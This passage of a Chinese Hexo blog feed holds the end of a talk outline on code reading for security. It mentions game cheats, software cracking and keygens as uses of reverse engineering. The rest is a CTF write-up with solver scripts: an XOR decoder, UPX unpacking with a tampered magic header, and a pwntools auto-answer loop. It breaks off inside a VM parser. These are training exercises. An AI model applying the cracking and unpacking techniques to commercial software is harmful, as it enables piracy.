的细节<ul><li>末尾有无补0</li><li>有无字符串反转</li><li>大端处理还是小端处理</li><li>密码算法常量有无魔改</li><li>…</li></ul></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">逆向分析</h2><p>&#x3D;&#x3D;</p><h3 id="找到感兴趣的逻辑"><a href="#找到感兴趣的逻辑" class="headerlink" title="找到感兴趣的逻辑"></a>找到感兴趣的逻辑</h3><h4 id="关键字符串"><a href="#关键字符串" class="headerlink" title="关键字符串"></a>关键字符串</h4><h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h4><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><h4 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h4><p>&#x3D;&#x3D;</p><h3 id="In-CTF…"><a href="#In-CTF…" class="headerlink" title="In CTF…"></a>In CTF…</h3><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128101038255.png"></p><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128101103520.png"></p><p>&#x3D;&#x3D;</p><h3 id="某软件分析"><a href="#某软件分析" class="headerlink" title="某软件分析"></a>某软件分析</h3><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128101555978.png"></p><p>&#x3D;&#x3D;</p><h3 id="In-Another-CTF…"><a href="#In-Another-CTF…" class="headerlink" title="In Another CTF…"></a>In Another CTF…</h3><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128104321059.png"></p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128103850221.png"></p><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128104802439.png"></p><p>&#x3D;&#x3D;</p><ul><li>逆向游戏逻辑（写挂，防外挂，游戏制作学习……）</li><li>破解软件</li><li>写注册机</li><li><a href="http://csapp.cs.cmu.edu/public/labs.html">CSAPP - Bomb Lab</a></li><li>……</li></ul><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">源码学习</h2><p>&#x3D;&#x3D;</p><h3 id="主函数入手"><a href="#主函数入手" class="headerlink" title="主函数入手"></a>主函数入手</h3><h4 id="随着函数调用逐层剖析"><a href="#随着函数调用逐层剖析" class="headerlink" title="随着函数调用逐层剖析"></a>随着函数调用逐层剖析</h4><p>&#x3D;&#x3D;</p><h3 id="rijndael-fst-3-0"><a href="#rijndael-fst-3-0" class="headerlink" title="rijndael-fst-3.0"></a>rijndael-fst-3.0</h3><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128110935779.png"></p><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128111501028.png"></p><p>&#x3D;&#x3D;</p><ul><li>源码学习（AES&#x2F;SHA&#x2F;……）</li></ul><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">接口使用</h2><p>&#x3D;&#x3D;</p><h3 id="传参和返回值"><a href="#传参和返回值" class="headerlink" title="传参和返回值"></a>传参和返回值</h3><h4 id="梳理数据通路"><a href="#梳理数据通路" class="headerlink" title="梳理数据通路"></a>梳理数据通路</h4><h4 id="命令行参数-or-交互"><a href="#命令行参数-or-交互" class="headerlink" title="命令行参数 or 交互"></a>命令行参数 or 交互</h4><p>&#x3D;&#x3D;</p><h3 id="rijndael-fst-3-0-1"><a href="#rijndael-fst-3-0-1" class="headerlink" title="rijndael-fst-3.0"></a>rijndael-fst-3.0</h3><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128112428343.png"></p><p>&#x3D;&#x3D;</p><ul><li>实习&#x2F;工作（在原有代码的基础上调接口 or 写文档）</li><li>使用工具</li></ul><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">工具魔改</h2><p>&#x3D;&#x3D;</p><h3 id="按需寻找"><a href="#按需寻找" class="headerlink" title="按需寻找"></a>按需寻找</h3><ul><li>兼容（新版本or新平台）<ul><li>根据报错信息修改</li><li>根据新版本的添加修改</li></ul></li><li>魔改功能<ul><li>定位功能</li><li>实行魔改</li></ul></li></ul><p>&#x3D;&#x3D;</p><h3 id="兼容新版本"><a href="#兼容新版本" class="headerlink" title="兼容新版本"></a>兼容新版本</h3><p>实例1：<a href="https://c10udlnk.topwpfor-2021qwb/#%E9%AD%94%E6%94%B9stegosaurus">【wp】2021强网杯-ExtremelySlow</a>（魔改stegosaurus使其兼容3.10）</p><p>实例2：<a href="https://c10udlnk.topblogsfor-hexo-puttinglivelyspinemodels/#spine-skeleton-binaryjs">在你的博客里放一只可爱的Spine Model吧~</a>（魔改解析skel高版本工具）</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128113144163.png"></p><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128113345500.png"></p><p>&#x3D;&#x3D;</p><h3 id="兼容新平台"><a href="#兼容新平台" class="headerlink" title="兼容新平台"></a>兼容新平台</h3><p>实例：<a href="https://c10udlnk.topblogsfor-hexo-addingdigitalraininmelody/">Melody主题的背景代码雨特效</a></p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128113811705.png"></p><p>&#x3D;&#x3D;</p><h3 id="魔改功能"><a href="#魔改功能" class="headerlink" title="魔改功能"></a>魔改功能</h3><p>实例：还是<a href="https://c10udlnk.topblogsfor-hexo-puttinglivelyspinemodels/#spine-skeleton-binaryjs">在你的博客里放一只可爱的Spine Model吧~</a>（魔改spine控制代码）</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128124636046.png"></p><p>&#x3D;&#x3D;</p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128123954374.png"></p><p><img src="/p/blogsFor-ComSec-readingCodes/image-20211128124117396.png"></p><p>&#x3D;&#x3D;&#x3D;</p><h2 class="subtitles">End...?</h2><p>&#x3D;&#x3D;</p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><ul><li>跟逆向破解的区别</li><li>更接近底层</li><li>利用对外接口，不改变程序逻辑</li><li><a href="http://csapp.cs.cmu.edu/public/labs.html">CSAPP - Buffer Lab</a></li></ul><p>&#x3D;&#x3D;&#x3D;</p><h1 id="End"><a href="#End" class="headerlink" title="End!"></a>End!</h1><ul><li><p><a href="https://c10udlnk.top/">https://c10udlnk.top/</a></p></li><li><p><a href="https://github.com/c10udlnk">https://github.com/c10udlnk</a></p></li><li><p><a href="mailto:&#x63;&#x31;&#x30;&#x75;&#100;&#x6c;&#x6e;&#x6b;&#x40;&#109;&#46;&#x73;&#99;&#110;&#x75;&#46;&#101;&#100;&#x75;&#46;&#x63;&#x6e;">&#x63;&#x31;&#x30;&#x75;&#100;&#x6c;&#x6e;&#x6b;&#x40;&#109;&#46;&#x73;&#99;&#110;&#x75;&#46;&#101;&#100;&#x75;&#46;&#x63;&#x6e;</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Train </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021Sloth选拔赛</title>
      <link href="p/wpFor-2021SlothTrial/"/>
      <url>p/wpFor-2021SlothTrial/</url>
      
        <content type="html"><![CDATA[<p>良心发现来把几百年前选拔赛的wp补了，毕竟热身赛有放fufu那道misc（逃</p><p>放个仓库传送门：<a href="https://github.com/scnu-sloth/hsctf-2021-trial">scnu-sloth&#x2F;hsctf-2021-trial: ISCNU x Sloth 网络安全研究组 2021 选拔赛 题目及wp</a></p><a id="more"></a><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Where-is-my-fufu"><a href="#Where-is-my-fufu" class="headerlink" title="Where is my fufu?"></a>Where is my fufu?</h2><p>图片名字<code>fufufufu.png</code>说明这一张图片里有两个fufu，需要把这个图片合并的东西拆出来，而且Hint里也有提binwalk不是万能的，那可以试试binwalk，虽然可以扫到但<code>-e</code>分不出来（binwalk一下——图片隐写常规套路了）</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115214120427.png"></p><p>所以用另一个拆分的软件<code>foremost</code>（硬件里经常用</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115215407158.png"></p><p>就可以在<code>output/png</code>里找到两张图片：</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115215235551.png"></p><p>然后这里有提示说是两张一样的图片 <del>（老婆）</del>，这时候就要试试盲水印了。</p><p>（注意，盲水印有很多种不同的版本，一个拆不出来可以多试几个，毕竟你也不知道出题人用的是哪个）</p><p>这里的盲水印用的是<a href="https://github.com/chishaxie/BlindWaterMark">chishaxie&#x2F;BlindWaterMark: 盲水印 by python</a>，用这个脚本直接解就能得到：</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115220255297.png"></p><p><img src="/p/wpFor-2021SlothTrial/result.png"></p><p>flag：<strong>flag{T0ver_sto1e_my_FUFU_-TAT-}</strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h2><p>签到题，主要难点估计在去除花指令上。</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214122204.png"></p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214209222.png"></p><p>这里是函数没有识别正确，跳过去重新转一下函数就好（按<code>u</code>把这一段undefined掉，然后重新<code>p</code>生成函数）</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214224235.png"></p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214440040.png"></p><p>下面没有识别出来的手动按<code>c</code>转代码</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214510934.png"></p><p>然后反编译出了<code>sub_11C9()</code>，可以看到最后是puts结尾，猜测只是一个混淆输出，与程序逻辑没什么关系。</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214616807.png"></p><p>主函数这边有两个经典的<code>call $+5</code>式花指令，在<a href="https://c10udlnk.top/p/reSkillsOn-ALLaboutJunkCode/#2021-ciscn%E6%80%BB%E5%86%B3%E8%B5%9B-junk">RE套路 - 关于逆向常客花指令 | c10udlnk_Log</a>中有解析，实际上等同于相同长度的nop（空指令）</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214921598.png"></p><p><img src="/p/wpFor-2021SlothTrial/image-20210915214936619.png"></p><p><img src="/p/wpFor-2021SlothTrial/image-20210915215048248.png"></p><p>然后转函数就能拿到主函数逻辑：</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915215645553.png"></p><p><code>loc_1232</code>的地方也是没有识别到的，需要跳过去进行转换。</p><p>可以转出来是：</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915215753161.png"></p><p>一个printf，又是没什么用的（打印出来的估计是提示信息</p><p>所以其实就是让输入的s满足<code>(dword_4020[i] ^ s[i]) == dword_4040[i]</code>就可</p><p>写wp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dst = [<span class="number">0x22</span>, <span class="number">0x5F</span>, <span class="number">0x43</span>, <span class="number">0x76</span>, <span class="number">0x2E</span>, <span class="number">0x34</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x07</span>, <span class="number">0x21</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x28</span>, <span class="number">0x15</span>, <span class="number">0x3A</span>, <span class="number">0x1B</span>, <span class="number">0xFE</span>, <span class="number">0x12</span>, <span class="number">0x01</span>, <span class="number">0x30</span>, <span class="number">0xED</span>, <span class="number">0xE9</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x65</span>, <span class="number">0xB8</span>, <span class="number">0xF5</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">arr = [<span class="number">0x44</span>, <span class="number">0x33</span>, <span class="number">0x22</span>, <span class="number">0x11</span>, <span class="number">0x55</span>, <span class="number">0x44</span>, <span class="number">0x33</span>, <span class="number">0x22</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x44</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x55</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dst)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(dst[i]^arr[i])</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>flag：<strong>flag{potatso_so_vegetable!}</strong></p><h2 id="ezMath"><a href="#ezMath" class="headerlink" title="ezMath"></a>ezMath</h2><p>拖进ida发现很诡异，可以用ExEinfoPE等查壳软件看到有upx壳。</p><p><img src="/p/wpFor-2021SlothTrial/image-20210915220652278.png"></p><p>用upx 3.94版本能直接脱壳（神奇），高版本因为magic字节被出题人 <del>（也就是我）</del> 魔改所以会报<code>l_info</code>的错误（</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115192107425.png"></p><p>通过这篇<a href="https://cujo.com/upx-anti-unpacking-techniques-in-iot-malware/">文章</a>可以知道l_info实际上是前面的一段header（不同版本的upx有不同的offset）</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115192217550.png"></p><p>正常来说一个upx加壳文件会出现三次magic字节（<code>UPX!</code>，还是在那篇文章中可以看到是被魔改的<code>YTS\x99</code>，如下图），一次在头部，两次在尾部。</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115163608175.png"></p><p>可以看到在头部的magic字节后的第三第四字节是<code>0D 0C</code>，而尾部最后一个magic字节后紧跟着的两个字节也是<code>0D 0C</code>，实际上这两个字节正是标明版本相关（具体不用管hhh，反正就在这个位置就对了）。</p><p>于是类推一下可以找到这个文件头部被魔改的magic应该在哪里：</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115191830390.png"></p><p><img src="/p/wpFor-2021SlothTrial/image-20211115191852312.png"></p><p>所以<code>06 22 11 03</code>部分应为<code>UPX!</code>（这里埋了个小彩蛋嘿嘿，dddd</p><p>所以把这里改成<code>UPX!</code>就可以正常脱壳啦~</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115192400715.png"></p><p>脱壳以后开始分析，发现这是一个简单的交互，要回答所有式子的答案，全部正确以后就可以获得flag。</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115192713940.png"></p><p>然而要回答0xDEAD次，所以必不可能是手答（整整五万多次呢）</p><p>有两种思路，一是Python写个自动交互计算的程序，然后摁跑，模拟手答：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./ezMath&quot;</span>)</span><br><span class="line">end = <span class="string">&#x27;Congratulations!&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line">r.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cal = r.readline()</span><br><span class="line">    <span class="keyword">if</span> cal[:<span class="built_in">len</span>(end)] == end:</span><br><span class="line">        print(cal)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    ans = <span class="built_in">str</span>(<span class="built_in">eval</span>(cal))</span><br><span class="line">    flag += ans</span><br><span class="line">    r.sendline(ans)</span><br><span class="line">    <span class="keyword">if</span> r.readline() != <span class="string">&#x27;OK! \n&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;???&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + md5(flag.encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>题目也有写，最后flag是交md5</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115192919637.png"></p><p>所以过十几秒就能跑出flag：</p><p><img src="/p/wpFor-2021SlothTrial/image-20211115194709060.png"></p><p>二是模拟程序执行的逻辑，手动把所有的答案都算出来，毕竟随机数种子都给了，直接cv一下重现ida里的代码就好：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">2</span>]; <span class="comment">// [rsp+26h] [rbp-Ah]</span></span><br><span class="line">  <span class="comment">// unsigned __int64 v24; // [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// v24 = __readfsqword(0x28u);</span></span><br><span class="line">  srandom(<span class="number">8225</span>);</span><br><span class="line">  v23[<span class="number">0</span>] = <span class="number">43</span>;</span><br><span class="line">  v23[<span class="number">1</span>] = <span class="number">45</span>;</span><br><span class="line">  <span class="comment">// puts(&quot;Welcome to EZest RE in the world!!! 0v0&quot;);</span></span><br><span class="line">  <span class="comment">// puts(&quot;Please answer all the math probs~&quot;);</span></span><br><span class="line">  <span class="comment">// puts(&quot;READY...?&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">57004</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v20 = v3 % <span class="number">21</span> + <span class="number">1</span>;</span><br><span class="line">    v18 = <span class="number">2021</span>;</span><br><span class="line">    <span class="comment">// printf((unsigned int)&quot;2021&quot;, (_DWORD)argv, v3 % 21, v3 % 21, v4, v5, v14);</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v20; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = (<span class="keyword">int</span>)rand() % <span class="number">21</span>;</span><br><span class="line">      v22 = rand() &amp; <span class="number">1</span>;</span><br><span class="line">      <span class="comment">// v22 = (unsigned __int8)v22;</span></span><br><span class="line">      <span class="comment">// printf((unsigned int)&quot; %c %d&quot;, v23[(unsigned __int8)v22], v21, v6, v7, v8, v15);</span></span><br><span class="line">      <span class="keyword">if</span> ( v22 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">          v18 -= v21;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Are you serious? &quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v18 += v21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, v18);</span><br><span class="line">    <span class="comment">// putchar(10LL);</span></span><br><span class="line">    <span class="comment">// argv = (const char **)&amp;v16;</span></span><br><span class="line">    <span class="comment">// _isoc99_scanf((unsigned int)&quot;%d&quot;, (unsigned int)&amp;v16, v9, v10, v11, v12, v15);</span></span><br><span class="line">    <span class="comment">// if ( v18 != v16 )</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//   puts(&quot;Try again and try again~ &quot;);</span></span><br><span class="line">    <span class="comment">//   return 0;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// puts(&quot;OK! &quot;);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// puts(&quot;Congratulations! Get your flag as \&quot;flag&#123;\&quot;+md5(str(answer1)+str(answer2)+...).hexdigest()+\&quot;&#125;\&quot;&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把结果存到<code>exp2.txt</code>里，最后对所有答案进行md5操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ans = f.read().strip()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span> + md5(ans.encode()).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021SlothTrial/image-20211115200038325.png"></p><p>flag：<strong>flag{474a444e5d6cb14261e8408e891ac1b8}</strong></p><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>啊~ VM题出得累死累活的，又累出题人又累选手，flag还那么棒 <del>（究极拉仇恨）</del> ，结果居然没人做TAT <del>（防AK大成功</del></p><p>没什么好说的啦，就硬逆呗，记住每个opcode的作用然后写个解析器就ok了（符号表都没去，手下留情了555）</p><p>剩下的就是看汇编&#x3D;v&#x3D;</p><p>解析器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ins_set=&#123;</span><br><span class="line">    <span class="number">0x00</span>:[<span class="number">1</span>,<span class="number">0</span>,<span class="string">&quot;exit&quot;</span>],</span><br><span class="line">    <span class="number">0x01</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;mov r&#123;0&#125;,0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x11</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;mov r&#123;0&#125;,r&#123;1&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x21</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;mov [r&#123;0&#125;],0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x31</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;mov [r&#123;0&#125;],r&#123;1&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x02</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;inc r&#123;0&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x03</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;push r&#123;0&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x04</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;pop r&#123;0&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x05</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;r&#123;0&#125; = getchar()&quot;</span>],</span><br><span class="line">    <span class="number">0x06</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;putchar(r&#123;0&#125;)&quot;</span>],</span><br><span class="line">    <span class="number">0x07</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;cmp r&#123;0&#125;,0x&#123;1:0&gt;2X&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x17</span>:[<span class="number">3</span>,<span class="number">2</span>,<span class="string">&quot;cmp [r&#123;0&#125;],[r&#123;1&#125;]&quot;</span>],</span><br><span class="line">    <span class="number">0x08</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;jnz &#123;0:0&gt;4&#125;&quot;</span>],</span><br><span class="line">    <span class="number">0x18</span>:[<span class="number">2</span>,<span class="number">1</span>,<span class="string">&quot;jmp 